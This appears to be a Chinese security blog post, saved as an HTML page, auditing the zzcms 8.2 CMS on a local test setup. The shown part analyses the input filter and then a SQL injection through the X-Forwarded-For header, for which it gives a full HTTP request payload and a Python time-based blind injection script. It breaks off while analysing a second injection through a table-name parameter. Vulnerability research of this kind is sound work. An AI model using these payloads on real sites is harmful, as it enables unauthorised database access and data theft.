@@ -1,0 +1,770 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Language" content="zh-cn">
+    <meta charset="utf-8">
+    
+    
+    
+    <title>代码审计--zzcms8.2 | Somnus&#39;s blog</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
+    
+    <meta name="theme-color" content="#77AAFF">
+    
+    
+    <meta name="keywords" content="代码审计">
+    
+    
+
+    
+
+    <!-- Baidu Push -->
+<script>
+	(function(){
+		var bp = document.createElement('script');
+		var curProtocol = window.location.protocol.split(':')[0];
+		if (curProtocol === 'https') {
+			bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+		}
+		else {
+			bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+		}
+		var s = document.getElementsByTagName("script")[0];
+		s.parentNode.insertBefore(bp, s);
+	})();
+
+	var _hmt = _hmt || [];
+</script>
+
+
+
+    
+    <meta name="description" content="代码审计">
+<meta name="keywords" content="代码审计">
+<meta property="og:type" content="article">
+<meta property="og:title" content="代码审计--zzcms8.2">
+<meta property="og:url" content="https://Foxgrin.github.io/posts/58925/index.html">
+<meta property="og:site_name" content="Somnus&#39;s blog">
+<meta property="og:description" content="代码审计">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://foxgrin.github.io/img/zzcms/1.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/zzcms/2.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/zzcms/3.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/zzcms/4.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/zzcms/5.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/zzcms/6.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/zzcms/7.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/zzcms/8.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/zzcms/9.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/zzcms/10.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/zzcms/11.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/zzcms/12.png">
+<meta property="og:updated_time" content="2019-03-01T07:07:40.288Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="代码审计--zzcms8.2">
+<meta name="twitter:description" content="代码审计">
+<meta name="twitter:image" content="https://foxgrin.github.io/img/zzcms/1.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Somnus&#39;s blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link id="style" rel="stylesheet" href="/css/style.css?v=3.0">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+            
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+    <aside id="menu"  class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" >
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/touxiang/1.jpg" alt="avatar">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname" id="name">Somnus</h5>
+          
+            <div id="yiyanmotto" class="motto">&nbsp;</div>
+          
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+              <li class="waves-block waves-effect">
+                  <a href="/"  >
+                    <i class="icon icon-lg icon-home"></i>
+                    <span>主 页</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/archives"  >
+                    <i class="icon icon-lg icon-archives"></i>
+                    <span>归 档</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/categories"  >
+                    <i class="icon icon-lg icon-th-list"></i>
+                    <span>分 类</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/tags"  >
+                    <i class="icon icon-lg icon-tags"></i>
+                    <span>标 签</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/about"  >
+                    <i class="icon icon-lg icon-smile-o"></i>
+                    <span>关 于</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+      <div class="nav2">
+          
+              <a class="nav2item" data-title="Email" href="mailto:823263808@qq.com" target="_parent"title="Email" >
+                <i class="icon icon-lg icon-envelope-o envelope-o"></i>
+              </a>
+          
+              <a class="nav2item" data-title="Github" href="https://github.com/Foxgrin" target="_blank"title="Github" >
+                <i class="icon icon-lg icon-github github"></i>
+              </a>
+          
+              <a class="nav2item" data-title="微博" href="https://weibo.com/u/6018528806" target="_blank"title="微博" >
+                <i class="icon icon-lg icon-weibo weibo"></i>
+              </a>
+          
+
+            </div>
+        
+      </ul>
+        
+    </div>
+  </div>
+ 
+</aside>
+
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">代码审计--zzcms8.2</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        <a href="../../atom.xml" target="_blank" class="header-icon waves-effect waves-circle waves-light" id="Rss">
+            <i class="icon icon-lg icon-rss"></i>
+        </a>
+    </div>
+</header>
+<header class="content-header post-header">
+    
+    
+    <div class="container fade-scale">
+        <div id="myheader">
+            <h1 class="title">
+                
+            </h1>
+            <h5 class="subtitle">
+                
+                
+            </h5>
+        </div>
+    </div>
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#环境安装"><span class="post-toc-number">1.</span> <span class="post-toc-text">环境安装</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#审计工具"><span class="post-toc-number">2.</span> <span class="post-toc-text">审计工具</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#全局分析"><span class="post-toc-number">3.</span> <span class="post-toc-text">全局分析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞分析"><span class="post-toc-number">4.</span> <span class="post-toc-text">漏洞分析</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#SQL注入漏洞1"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">SQL注入漏洞1</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#位置"><span class="post-toc-number">4.1.1.</span> <span class="post-toc-text">位置</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#分析"><span class="post-toc-number">4.1.2.</span> <span class="post-toc-text">分析</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#复现"><span class="post-toc-number">4.1.3.</span> <span class="post-toc-text">复现</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#SQL注入漏洞2"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">SQL注入漏洞2</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#位置-1"><span class="post-toc-number">4.2.1.</span> <span class="post-toc-text">位置</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#分析-1"><span class="post-toc-number">4.2.2.</span> <span class="post-toc-text">分析</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#复现-1"><span class="post-toc-number">4.2.3.</span> <span class="post-toc-text">复现</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#XSS漏洞1"><span class="post-toc-number">4.3.</span> <span class="post-toc-text">XSS漏洞1</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#位置-2"><span class="post-toc-number">4.3.1.</span> <span class="post-toc-text">位置</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#分析-2"><span class="post-toc-number">4.3.2.</span> <span class="post-toc-text">分析</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#复现-2"><span class="post-toc-number">4.3.3.</span> <span class="post-toc-text">复现</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#XSS漏洞2"><span class="post-toc-number">4.4.</span> <span class="post-toc-text">XSS漏洞2</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#位置-3"><span class="post-toc-number">4.4.1.</span> <span class="post-toc-text">位置</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#分析-3"><span class="post-toc-number">4.4.2.</span> <span class="post-toc-text">分析</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#复现-3"><span class="post-toc-number">4.4.3.</span> <span class="post-toc-text">复现</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#文件上传漏洞"><span class="post-toc-number">4.5.</span> <span class="post-toc-text">文件上传漏洞</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#位置-4"><span class="post-toc-number">4.5.1.</span> <span class="post-toc-text">位置</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#分析-4"><span class="post-toc-number">4.5.2.</span> <span class="post-toc-text">分析</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#复现-4"><span class="post-toc-number">4.5.3.</span> <span class="post-toc-text">复现</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#任意文件删除漏洞"><span class="post-toc-number">4.6.</span> <span class="post-toc-text">任意文件删除漏洞</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#位置-5"><span class="post-toc-number">4.6.1.</span> <span class="post-toc-text">位置</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#分析-5"><span class="post-toc-number">4.6.2.</span> <span class="post-toc-text">分析</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#复现-5"><span class="post-toc-number">4.6.3.</span> <span class="post-toc-text">复现</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#后记"><span class="post-toc-number">5.</span> <span class="post-toc-text">后记</span></a></li></ol>
+        </nav>
+    </aside>
+   
+<article id="post-zzcms8.2审计"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">代码审计--zzcms8.2</h1>
+        <div class="post-meta">
+            <i class="icon icon-lg icon-calendar-o"></i>
+            发表于
+            <time class="post-time" title="2019-02-26 19:15:00" datetime="2019-02-26T11:15:00.000Z"  itemprop="datePublished">2019-02-26</time>
+
+            <br id="mybreak"/>
+            
+	<i class="icon icon-lg icon-folder-o"></i>
+	分类：<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/代码审计/">代码审计</a></li></ul>
+
+
+            <i>·</i>
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>次浏览
+</span>
+
+
+        </div>
+        <div class="post-count-custom">
+            <i class="icon icon-lg icon-comment-o"></i>
+            阅读本文可能花费您&nbsp;<span class="post-count">18</span>&nbsp;分钟
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p>记录zzcms8.2审计过程以及漏洞分析<a id="more"></a></p>
+<h2 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h2><p>本地搭建的环境是phpstudy，在设置中打开允许目录列表（不然可能会出现403无法访问的情况），然后访问<a href="http://localhost/install进行安装" target="_blank" rel="noopener">http://localhost/install进行安装</a></p>
+<h2 id="审计工具"><a href="#审计工具" class="headerlink" title="审计工具"></a>审计工具</h2><p>采用的审计工具是<strong>Seay源代码审计系统</strong>，将cms文件夹丢进去就可以帮助你分析出可能存在的漏洞以及对应的文件名，便于我们快速锁定漏洞所在，不用一个个文件去审计。</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/zzcms/1.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>该审计工具还可以进行关键字的全局搜索功能，能帮助我们快速锁定关键函数等。</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/zzcms/2.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<h2 id="全局分析"><a href="#全局分析" class="headerlink" title="全局分析"></a>全局分析</h2><p>先进入网站根目录网站index.php，发现包含了关键的文件<strong>/inc/conn.php</strong>，跟进文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/inc/conn.php</span></span><br><span class="line"><span class="keyword">include</span>(zzcmsroot.<span class="string">"/inc/config.php"</span>);</span><br><span class="line"><span class="keyword">include</span>(zzcmsroot.<span class="string">"/inc/wjt.php"</span>);</span><br><span class="line"><span class="keyword">include</span>(zzcmsroot.<span class="string">"/inc/function.php"</span>);</span><br><span class="line"><span class="keyword">include</span>(zzcmsroot.<span class="string">"/inc/zsclass.php"</span>);</span><br><span class="line"><span class="keyword">include</span>(zzcmsroot.<span class="string">"/inc/stopsqlin.php"</span>);</span><br><span class="line"><span class="keyword">include</span>(zzcmsroot.<span class="string">"/inc/area.php"</span>);</span><br></pre></td></tr></table></figure>
+<p>在conn.php文件中，可以看到又包含许多文件，其中stopsqlin.php文件很明显就是用来防止SQL注入，既然我们要寻找这个cms的漏洞，那么必然需要了解这个网站预防SQL注入的措施，所以继续跟进<strong>stopsqlin.php</strong>文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/inc/stopsqlin.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">zc_check</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!is_array($string))&#123;</span><br><span class="line">		<span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</span><br><span class="line">	 	<span class="keyword">return</span> htmlspecialchars(trim($string));</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> addslashes(htmlspecialchars(trim($string)));</span><br><span class="line">		&#125;</span><br><span class="line">	 &#125;</span><br><span class="line">	<span class="keyword">foreach</span>($string <span class="keyword">as</span> $k =&gt; $v) $string[$k] = zc_check($v);</span><br><span class="line">	<span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_REQUEST)&#123;</span><br><span class="line">	$_POST =zc_check($_POST);</span><br><span class="line">	$_GET =zc_check($_GET);</span><br><span class="line">	$_COOKIE =zc_check($_COOKIE);</span><br><span class="line">	@extract($_POST);</span><br><span class="line">	@extract($_GET);	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>zc_check</strong>函数的作用的就是检查魔术引号功能是否开启，未开启的话就利用addslashes函数对全局变量$_REQUEST的特殊符号进行转义处理，防止SQL注入，这里我们就必须知道，当某个文件包含了/inc/conn.php，那么这个文件就对所有POST，GET或者COOKIE的中的变量进行了特殊字符的转义处理。</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="SQL注入漏洞1"><a href="#SQL注入漏洞1" class="headerlink" title="SQL注入漏洞1"></a>SQL注入漏洞1</h3><h4 id="位置"><a href="#位置" class="headerlink" title="位置"></a>位置</h4><p>/user/check.php第二十行</p>
+<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#/user/check.php</span><br><span class="line">&lt;?php</span><br><span class="line">include(&quot;../inc/conn.php&quot;);</span><br><span class="line">if (!isset($_COOKIE[&quot;UserName&quot;]) || !isset($_COOKIE[&quot;PassWord&quot;]))&#123;</span><br><span class="line">echo &quot;&lt;script&gt;location.href=&apos;/user/login.php&apos;;&lt;/script&gt;&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$username=nostr($_COOKIE[&quot;UserName&quot;]);</span><br><span class="line">	$rs=query(&quot;select id,usersf,lastlogintime from zzcms_user where lockuser=0 and username=&apos;&quot;.$username.&quot;&apos; and password=&apos;&quot;.$_COOKIE[&quot;PassWord&quot;].&quot;&apos;&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>我们可以发现/user/check.php文件是包含了关键文件/inc/conn.php的，所以第一个查询语句</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query(<span class="string">"select id,usersf,lastlogintime from zzcms_user where lockuser=0 and username='"</span>.$username.<span class="string">"' and password='"</span>.$_COOKIE[<span class="string">"PassWord"</span>].<span class="string">"'"</span>);</span><br></pre></td></tr></table></figure>
+<p>经过单引号包裹，并且$username和$password都来自全局变量COOKIE，所以无法进行SQL注入</p>
+<p>在第二十行的第二个查询语句：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query(<span class="string">"UPDATE zzcms_user SET loginip = '"</span>.getip().<span class="string">"' WHERE username='"</span>.$username.<span class="string">"'"</span>);</span><br></pre></td></tr></table></figure>
+<p>我们可以发现拼接的参数是<strong>getip()</strong>函数的返回值，我们在Seay审计系统中对<strong>getip()</strong>函数进行全局搜索</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#/inc/function.php</span><br><span class="line">&lt;?php</span><br><span class="line">function getip()&#123; </span><br><span class="line">if (getenv(&quot;HTTP_CLIENT_IP&quot;) &amp;&amp; strcasecmp(getenv(&quot;HTTP_CLIENT_IP&quot;), &quot;unknown&quot;)) </span><br><span class="line">$ip = getenv(&quot;HTTP_CLIENT_IP&quot;); </span><br><span class="line">else if (getenv(&quot;HTTP_X_FORWARDED_FOR&quot;) &amp;&amp; strcasecmp(getenv(&quot;HTTP_X_FORWARDED_FOR&quot;), &quot;unknown&quot;)) </span><br><span class="line">$ip = getenv(&quot;HTTP_X_FORWARDED_FOR&quot;); </span><br><span class="line">else if (getenv(&quot;REMOTE_ADDR&quot;) &amp;&amp; strcasecmp(getenv(&quot;REMOTE_ADDR&quot;), &quot;unknown&quot;)) </span><br><span class="line">$ip = getenv(&quot;REMOTE_ADDR&quot;); </span><br><span class="line">else if (isset($_SERVER[&apos;REMOTE_ADDR&apos;]) &amp;&amp; $_SERVER[&apos;REMOTE_ADDR&apos;] &amp;&amp; strcasecmp($_SERVER[&apos;REMOTE_ADDR&apos;], &quot;unknown&quot;)) </span><br><span class="line">$ip = $_SERVER[&apos;REMOTE_ADDR&apos;]; </span><br><span class="line">else </span><br><span class="line">$ip = &quot;unknown&quot;; </span><br><span class="line">return($ip); </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>可以发现ip我们是可以自己构造的，所以会导致SQL注入攻击</p>
+<h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><p>事先在/reg/userreg.php页面注册账号，账号名为test，密码为test，注意这里密码是以md5加密的形式存储在数据库中的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/reg/userregpost.php 第182行中注册成功后将用户信息写入zzcms_user表中</span></span><br><span class="line">query(<span class="string">"INSERT INTO zzcms_user (username,password,passwordtrue,usersf,comane,content,somane,sex,phone,email,img,totleRMB,regdate,lastlogintime)VALUES('$username','"</span>.md5($password).<span class="string">"','$password','$usersf','$comane','&amp;nbsp;','$somane','1','$phone','$email','/image/nopic.gif','"</span>.jf_reg.<span class="string">"','"</span>.date(<span class="string">'Y-m-d H:i:s'</span>).<span class="string">"','"</span>.date(<span class="string">'Y-m-d H:i:s'</span>).<span class="string">"')"</span>);</span><br></pre></td></tr></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/zzcms/3.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>注册用户后，我们就可以构造<strong>PAYLOAD</strong>进行SQL注入攻击了，这里关键参数ip字段我采用的是头部的<strong>X-Forwarded-For</strong>字段，因为是这里的SQL语句是<strong>UPDATE</strong>语句，所以我采用的是基于<strong>时间</strong>的盲注，给出我的payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /user/check.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=adad7183ca248a9be539f0a153ce72f8; bdshare_firstime=1551059496947;UserName=test;PassWord=098f6bcd4621d373cade4e832627b4f6</span><br><span class="line">X-Forwarded-For: 1.1.1.1&apos; and if(ascii(substr(database(),1,1))=122,sleep(3),1)#</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+<p>再贴上盲注的具体脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment">#/user/check.php</span></span><br><span class="line">url = <span class="string">"http://127.0.0.1/user/check.php"</span></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">"Cookie"</span>:<span class="string">"UserName=test;PassWord=098f6bcd4621d373cade4e832627b4f6"</span>,</span><br><span class="line">            <span class="string">"X-Forwarded-For"</span>:<span class="string">"1.1.1.1' and if(ascii(substr(database(),%d,1))=%d,sleep(3),1)#"</span>%(i,j)</span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.get(url,headers=headers)</span><br><span class="line">        t = r.elapsed.total_seconds()</span><br><span class="line">        <span class="keyword">if</span> t &gt;= <span class="number">3</span>:</span><br><span class="line">            database = database + chr(j)</span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span> <span class="keyword">and</span> j == <span class="number">122</span>:</span><br><span class="line">        print(<span class="string">"database:"</span>,database)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<h3 id="SQL注入漏洞2"><a href="#SQL注入漏洞2" class="headerlink" title="SQL注入漏洞2"></a>SQL注入漏洞2</h3><h4 id="位置-1"><a href="#位置-1" class="headerlink" title="位置"></a>位置</h4><p>/user/del.php第139行</p>
+<h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#/user/del.php 第139行</span><br><span class="line">&lt;?php</span><br><span class="line">	$sql=&quot;select id,editor from &quot;.$tablename.&quot; where id =&apos;$id&apos;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这句SQL语句不同其他处的SQL语句，是通过两个变量$tablename和$id拼接而成的，更特别的是这里的$tablename是不同于特定情况的，我们跟进变量$tablename和$id</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/user/del.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pagename=trim($_POST[<span class="string">"pagename"</span>]);</span><br><span class="line">$tablename=trim($_POST[<span class="string">"tablename"</span>]);</span><br><span class="line">$id=<span class="string">""</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'id'</span>]))&#123;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;count($_POST[<span class="string">'id'</span>]);$i++)&#123;</span><br><span class="line">	checkid($_POST[<span class="string">'id'</span>][$i]);</span><br><span class="line">    $id=$id.($_POST[<span class="string">'id'</span>][$i].<span class="string">','</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	$id=substr($id,<span class="number">0</span>,strlen($id)<span class="number">-1</span>);<span class="comment">//去除最后面的","</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($id) || $id==<span class="string">""</span>)&#123;</span><br><span class="line">showmsg(<span class="string">'操作失败！至少要选中一条信息。'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可知变量$id和$tablename都是经过POST方式获得，但是$id经过checkid的消毒处理，我们无法通过该变量进行攻击，再看$tablename，之后的switch语句对$tablename的值进行判断并分别执行对应的sql语句，我们跟进到135行，便可以发现此处的$tablename的值是排除上面所有特殊值的情况</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/user/del.php</span></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (strpos($id,<span class="string">","</span>)&gt;<span class="number">0</span>)&#123;	</span><br><span class="line">	$sql=<span class="string">"select id,editor from "</span>.$tablename.<span class="string">" where id in ("</span>. $id .<span class="string">")"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;	</span><br><span class="line">	$sql=<span class="string">"select id,editor from "</span>.$tablename.<span class="string">" where id ='$id'"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>并且此处的SQL语句中的变量$tablename没有经过单引号包裹，所有我们可以通过这个变量进行SQL攻击</p>
+<h4 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h4><p>首先我们必须确定列id和editor是属于具体哪个表的</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
